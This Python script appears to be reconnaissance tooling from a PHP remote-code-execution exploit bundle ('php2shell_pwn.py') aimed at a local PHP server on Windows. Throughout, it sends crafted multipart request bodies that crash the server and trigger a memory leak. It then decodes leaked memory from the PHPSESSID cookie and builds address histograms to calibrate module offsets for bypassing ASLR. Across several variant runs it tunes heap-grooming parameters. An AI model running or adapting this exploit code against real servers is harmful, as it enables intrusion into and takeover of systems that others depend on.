#!/usr/bin/env python3
"""Windows recon: A1 crash then B1 leak capture + qword histograms.
Prints compact evidence to calibrate module-anchor offsets for Win x64."""
import importlib.util
import os
import struct
import subprocess
import sys
import tempfile
from collections import Counter
from urllib.parse import unquote_to_bytes

HERE = os.path.dirname(os.path.abspath(__file__))
spec = importlib.util.spec_from_file_location("p2s", os.path.join(HERE, "php2shell_pwn.py"))
m = importlib.util.module_from_spec(spec)
try:
    spec.loader.exec_module(m)
except SystemExit:
    pass

PURE = os.path.join(HERE, "pure")  # helpers live in pure/ of the bundle
URL = "http://127.0.0.1:8085/"
url = m.normalize_url(URL)
conn = m.Conn(url[0], url[1], url[2], 90.0, True, "", {}, proxy=None)

control = (b"--C\r\nContent-Disposition: form-data; name=\"a\"; filename=\"\r\n\r\n\r\n--C--\r\n")
st, hd, _b = conn.request(url[3], control, chunked=False)
print("[*] control: HTTP %d %dB X-Powered-By=%r" % (st, len(_b), hd.get("x-powered-by", "")))

def hist(dec):
    mod = Counter()   # 0x00007F00_00000000..0x00007FFF_FFFFFFFF
    low = Counter()   # heap/stack: 0x00000040..0x00007F00_00000000
    total = 0
    for off in range(0, len(dec) - 8, 8):
        q = struct.unpack_from("<Q", dec, off)[0]
        if q < 0x10000 or q > 0x00007FFFFFFF0000:
            continue
        total += 1
        if 0x00007F0000000000 <= q <= 0x00007FFFffffffff:
            mod[q] += 1
        elif q < 0x00007F0000000000:
            low[q] += 1
    return total, mod, low

ARMS = [
    ("n6", ["--parts", "890", "--depth", "58", "--big", "72", "--big-len", "65500",
            "--bigs17", "6", "--big-len17", "66000",
            "--fillers128", "4", "--burners", "30", "--burner-len", "7500"]),
    ("n7", ["--parts", "890", "--depth", "58", "--big", "72", "--big-len", "65500",
            "--bigs17", "7", "--big-len17", "66000",
            "--fillers128", "4", "--burners", "30", "--burner-len", "7500"]),
    ("n8", ["--parts", "890", "--depth", "58", "--big", "72", "--big-len", "65500",
            "--bigs17", "8", "--big-len17", "66000",
            "--fillers128", "4", "--burners", "30", "--burner-len", "7500"]),
    ("n9", ["--parts", "890", "--depth", "58", "--big", "72", "--big-len", "65500",
            "--bigs17", "9", "--big-len17", "66000",
            "--fillers128", "4", "--burners", "30", "--burner-len", "7500"]),
    ("n10", ["--parts", "890", "--depth", "58", "--big", "72", "--big-len", "65500",
             "--bigs17", "10", "--big-len17", "66000",
             "--fillers128", "4", "--burners", "30", "--burner-len", "7500"]),
    ("n11", ["--parts", "890", "--depth", "58", "--big", "72", "--big-len", "65500",
             "--bigs17", "11", "--big-len17", "66000",
             "--fillers128", "4", "--burners", "30", "--burner-len", "7500"]),
    ("n12", ["--parts", "890", "--depth", "58", "--big", "72", "--big-len", "65500",
             "--bigs17", "12", "--big-len17", "66000",
             "--fillers128", "4", "--burners", "30", "--burner-len", "7500"]),
]

for attempt, (tag, knobs) in enumerate(ARMS, start=1):
    a1 = os.path.join(tempfile.mkdtemp(prefix="rc_"), "a.bin")
    subprocess.run([sys.executable, os.path.join(PURE, "mk_a1.py"), "--out", a1,
                    "--big", "78"] + knobs, check=True, stdout=subprocess.DEVNULL)
    body = open(a1, "rb").read()
    try:
        st, _h, _b = conn.request(url[3] + m.Q, body, chunked=True)
    except Exception as exc:
        conn.close()
        st = 0
        try:
            conn.connect()
        except Exception:
            pass
    print("[*] try%d(%s) A1 %dB -> %s" % (attempt, tag, len(body),
          ("HTTP %d %dB" % (st, len(_b))) if st else "conn-lost"))
    if b"Allowed memory size of" in _b:
        print("[*] try%d(%s) A1 fatal: %r" % (attempt, tag,
              _b[:150].decode("utf-8", "replace")))
    elif st and len(_b) < 400 and _b:
        print("[*] try%d(%s) A1 short body: %r" % (attempt, tag,
              _b[:200].decode("utf-8", "replace")))

    b1 = os.path.join(tempfile.mkdtemp(prefix="rc_"), "b1.bin")
    subprocess.run([sys.executable, os.path.join(PURE, "mk_leak_b.py"), "--out", b1,
                    "--spec", m.LEAK_SPEC, "--fake-len", "0xC8000", "--tag"],
                   check=True, stdout=subprocess.DEVNULL)
    body = open(b1, "rb").read()
    try:
        st, headers, resp = conn.request(url[3], body, chunked=True)
    except Exception as exc:
        conn.close()
        print("[*] try%d B1 conn lost: %r" % (attempt, type(exc).__name__))
        try:
            conn.connect()
        except Exception:
            pass
        continue
    sc = headers.get("set-cookie", "")
    print("[*] try%d B1 -> HTTP %d, set-cookie len=%d, body=%dB" %
          (attempt, st, len(sc), len(resp)))
    px = sc.find("PHPSESSID=")
    raw = sc[px + 10:] if px >= 0 else sc
    for cut in (";", ","):
        j = raw.find(cut)
        if j >= 0:
            raw = raw[:j]
    dec = unquote_to_bytes(raw).replace(b"+", b" ")
    print("[*] try%d decoded leak=%dB" % (attempt, len(dec)))
    total, mod, low = hist(dec)
    print("[*] try%d candidate qwords=%d (mod=%d uniq, low=%d uniq)" %
          (attempt, total, len(mod), len(low)))
    print("[*] try%d MOD top12:" % attempt)
    for q, c in mod.most_common(12):
        print("    %#018x x%d  page-align0x%x" % (q, c, q & ~0xFFF))
    print("[*] try%d LOW top8:" % attempt)
    for q, c in low.most_common(8):
        print("    %#018x x%d" % (q, c))
    buckets = Counter()
    for q, c in low.items():
        buckets[q & ~0x1FFFFF] += c
    print("[*] try%d LOW buckets(2MB) top6:" % attempt)
    for b, c in buckets.most_common(6):
        print("    %#018x x%d" % (b, c))
    print("[*] try%d head hex:" % attempt)
    print("    " + dec[:160].hex())
conn.close()
print("[=] recon done")
